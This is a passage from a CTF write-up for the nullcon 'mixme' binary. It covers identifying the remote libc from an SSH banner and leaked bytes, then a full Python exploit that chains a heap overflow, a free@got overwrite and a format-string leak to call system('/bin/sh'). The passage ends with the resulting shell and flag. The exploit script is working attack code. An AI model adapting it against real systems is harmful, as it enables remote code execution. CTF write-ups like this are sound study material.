-<p>We notice two things: ALSR is on and the remote binary seems to have a different libc than my local box (which was an Ubuntu 12.04 VM). I turned the format string into <code>%3$s</code> to find out which bytes were on the local and remote libc address. For the local binary, it returned <code>0x168bc085</code>. For the remote binary, however, it returned <code>0x7501c083</code>. These differences pointed towards different versions of libc. This was a nightmare! How am I supposed to find anything useful in libc without access to the specific library?</p>
-
-<h2>Finding the correct libc</h2>
-
-<p>I decided to try and identify the libc version. With less than 60 minutes to go, I went for it. If I had the right version of libc, I had everything to leak a libc address, add an offset to get <code>system()</code> and spawn a shell. I tried to nmap the remote server, which seemed too slow. However, <code>ssh</code> was enabled:</p>
-
-<pre><code class="bash">bas@tritonal:~/tmp/nullcon/mixme$ ssh test@54.163.248.69 -vvv
-OpenSSH_6.0p1 Debian-4+deb7u2, OpenSSL 1.0.1e 11 Feb 2013
-debug1: Reading configuration data /etc/ssh/ssh_config
-debug1: /etc/ssh/ssh_config line 19: Applying options for *
-debug2: ssh_connect: needpriv 0
-debug1: Connecting to 54.163.248.69 [54.163.248.69] port 22.
-debug1: Connection established.
-debug1: identity file /home/bas/.ssh/id_rsa type -1
-debug1: identity file /home/bas/.ssh/id_rsa-cert type -1
-debug1: identity file /home/bas/.ssh/id_dsa type -1
-debug1: identity file /home/bas/.ssh/id_dsa-cert type -1
-debug1: identity file /home/bas/.ssh/id_ecdsa type -1
-debug1: identity file /home/bas/.ssh/id_ecdsa-cert type -1
-debug1: Remote protocol version 2.0, remote software version OpenSSH_6.6.1p1 Ubuntu-2ubuntu2
-&lt;snip&gt;
-</code></pre>
-
-<p>Googling <code>OpenSSH_6.6.1p1 Ubuntu-2ubuntu2</code> led me to believe that Ubuntu 14.04 was being run. I downloaded all the i386 libc version I could find, unpacked them and searched them for the bytes I just leaked:</p>
-
-<pre><code class="bash">bas@tritonal:~/tmp/nullcon/mixme/libc$ for i in `ls`; do echo $i; echo; xxd $i | egrep '83.?c0.?01.?75'; echo; done
-
-
-libc-2.15-0ubuntu10.9.so
-
-0043740: 8934 24e8 f8f4 0200 83c0 0175 b0c7 8570  .4$........u...p
-00460a0: 0000 0089 3424 e895 cb02 0083 c001 75bb  ....4$........u.
-0046720: 0200 83c0 0175 80c7 8570 fbff ffff ffff  .....u...p......
-0046810: 2cc4 0200 83c0 0175 a5c7 8570 fbff ffff  ,......u...p....
-0046890: e8ab c302 0083 c001 75ac c785 70fb ffff  ........u...p...
-0047320: 4424 04e8 18b9 0200 83c0 0175 80c7 8570  D$.........u...p
-0047410: 0000 0089 3424 e825 b802 0083 c001 75a4  ....4$.%......u.
-005a180: 83c0 0175 a4c7 85b0 efff ffff ffff ffe9  ...u............
-005b410: 3424 e8f9 1001 0083 c001 75ae c785 b0ef  4$........u.....
-005c370: 0089 3424 e897 0101 0083 c001 7580 c785  ..4$........u...
-00674c0: 0a00 0000 8904 24e8 74b7 0000 83c0 0175  ......$.t......u
-
-libc-2.16-0ubuntu6.so
-
-0047b50: 83c0 0175 a8e9 97bf ffff 81e1 ff00 0000  ...u............
-005ad90: 0083 c001 75b9 e95b ccff ff8b 4d10 8b45  ....u..[....M..E
-0066ab0: 7cb4 0000 83c0 0175 918d b426 0000 0000  |......u...&amp;....
-
-libc-2.19-0ubuntu6.4.so
-
-00471c0: 0489 3424 e817 9e02 0083 c001 758a e9d1  ..4$........u...
-0047920: 24e8 ba96 0200 83c0 0175 c5e9 74c2 ffff  $........u..t...
-005a850: 8904 24e8 d801 0100 83c0 0175 b8e9 04cc  ..$........u....
-005b3a0: 83c0 0175 c9e9 bcc0 ffff a810 8d74 2600  ...u.........t&amp;.
-0066020: bcaf 0000 83c0 0175 988d b426 0000 0000  .......u...&amp;....
-
-libc-2.19-13ubuntu3.so
-
-00472a0: 0489 3424 e877 9c02 0083 c001 758a e9d1  ..4$.w......u...
-0047a00: 0000 8934 24e8 1695 0200 83c0 0175 c5e9  ...4$........u..
-0050e40: 8904 24e8 6879 0100 83c0 0175 b8e9 04cc  ..$.hy.....u....
-0051990: 83c0 0175 c9e9 bcc0 ffff a810 8d74 2600  ...u.........t&amp;.
-0066100: 1cae 0000 83c0 0175 988d b426 0000 0000  .......u...&amp;....
-</code></pre>
-
-<p>I struck gold with libc-2.19-0ubuntu6.4.so:</p>
-
-<pre><code>0066020: bcaf 0000 83c0 0175 988d b426 0000 0000  .......u...&amp;....
-</code></pre>
-
-<p>Those bytes (0x7501c083) where at an offset of <code>xxxx6024</code> in the binary, which looked very much like the third address on the stack dumped from the remote binary. This had to be the right libc version! I loaded up the binary on my Ubuntu VM with libc-2.19-0ubuntu6.4.so:</p>
-
-<pre><code class="bash">LD_PRELOAD=./libc-2.19-0ubuntu6.14.so ./mixme
-</code></pre>
-
-<p>and attached <code>gdb</code> to dump the address of <code>system()</code>. Using the aforementioned value from the stack, I calculated the offset to <code>system()</code>. I quickly modified my script to include this, overwriting <code>free@got</code> with <code>system()</code>. When I now made a note with the value <code>/bin/sh</code> and asked the binary to <code>get</code> that note, it wants to <code>free()</code> it. However, <code>free@got</code> is replaced with system(), effectively making the binary call <code>system('/bin/sh');</code>!</p>
-
-<p>So, in true dirty-ctf-style, the following python script was written after hours of frantic tracing with gdb and coding in python.</p>
-
-<pre><code class="python">import re
-import string
-import struct
-import socket
-import time
-import telnetlib
-import sys
-
-def p(x):
-    return struct.pack('&lt;L', x)
-
-# function to send commands to the binary
-def z(sock, x):
-    sock.send(x + '\n')
-    time.sleep(0.01)
-    data = sock.recv(200)
-    time.sleep(0.01)
-    return data
-
-# connect to remote host
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(('54.163.248.69', 9005))
-
-# receive banner
-s.recv(512)
-
-# ask the binary to store three notes
-# we'll overflow a into b later on
-z(s, "store")
-z(s, "a")
-z(s, "4")
-z(s, "AAAA")
-
-z(s, "store")
-z(s, "b")
-z(s, "4")
-z(s, "BBBB")
-
-# the third note will hold our format string
-z(s, "store")
-z(s, "c")
-format_str = "--%3$x"
-z(s, str(len(format_str)))
-z(s, format_str)
-
-# edit a with a large value
-# this overflows and overwrites the note_info struct of b
-# the pointer to the data is overwriting with free@got
-print "[+] overflowing a to set b to free@got"
-z(s, 'edit')
-z(s, 'a')
-z(s, '40')
-z(s, "A"*12+"\x29\x00\x00\x00\x62\x00\x00\x00"+"A"*12+p(4)+p(0x804b020))
-#     ^ overflow    ^ restore 0x29, 'b'               ^ size of b ^ free@got
-
-# overwrite free@got with printf
-print "[+] replacing free() with printf()"
-z(s, 'edit')
-z(s, 'b')
-z(s, '4')
-z(s, p(0x080485f0)) # free@got overwritten with printf
-
-# now 'get' c and trigger the format string vulnerability
-print "[+] triggering format string"
-z(s, "get")
-z(s, "c")
-data = z(s, str(len(format_str)))
-time.sleep(0.1)
-
-# this proved to be a bit finicky:
-data += s.recv(256)
-data += s.recv(256)
-
-print data
-# grab leaked libc address
-m = re.findall(r'x--(.*)cSel', data)
-if m: 
-    print m
-    leak = "0x"+m[0]
-    leak_hex = int(leak, 16)
-    print "[+] found first addr: {}".format(hex(leak_hex))
-    system = leak_hex - 155428
-    print "[+] system @ {}".format(hex(system))
-
-# repeat the same trick, but this time, overwrite free@got with system()
-# first note contains /bin/sh, used as argument for system()
-z(s, "store")
-z(s, "sh")
-z(s, "7")
-z(s, "/bin/sh")
-
-z(s, "store")
-z(s, "t")
-z(s, "4")
-z(s, "TTTT")
-
-z(s, "store")
-z(s, "q")
-z(s, "4")
-z(s, "QQQQ")
-
-print "[+] overflowing t to set q to free@got"
-z(s, 'edit')
-z(s, 't')
-z(s, '40')
-z(s, "A"*12+"\x29\x00\x00\x00\x71\x00\x00\x00"+"A"*12+p(4)+p(0x804b020))
-#     ^ overflow              ^ restore 'q'           ^ size of q  ^ free@got
-
-print "[+] replacing free() with system()"
-z(s, 'edit')
-z(s, 'q')
-z(s, '4')
-z(s, p(system))     # free@got overwritten with system
-
-# trigger system('/bin/sh')
-z(s, 'get')
-z(s, 'sh')  # this note contains '/bin/sh' and those contents are passed to system()
-z(s, '7')
-
-# shell spawned, interact with it!
-t=telnetlib.Telnet()
-t.sock=s
-t.interact()
-
-s.close()
-</code></pre>
-
-<p>I ran it, and to my surprise, I got it right the first time! I dropped into a shell on the remote box:</p>
-
-<pre><code class="bash">root@ubuntu-VirtualBox:/home/ubuntu/nullcon/mixme# python exploit.py
-[+] overflowing a to set b to free@got
-[+] replacing free() with printf()
-[+] triggering format string
-Name: Size: --%3$x--b768d024cSelect op (store/get/edit/exit): 
-['b768d024']
-[+] found first addr: 0xb768d024L
-[+] system @ 0xb7667100L
-[+] overflowing t to set q to free@got
-[+] replacing free() with system()
-/bin/sh
-id
-uid=1005 gid=1005 groups=0
-cat flag.txt
-aw3s0m3++_hipp1e_pwn_r0ckst4r
-</code></pre>
-
-<p>The flag was <code>aw3s0m3++_hipp1e_pwn_r0ckst4r</code>. This one was really though and I&rsquo;m glad I managed to beat it with just 20 minutes left for the ctf!</p>
 ]]></content>
   </entry>
   
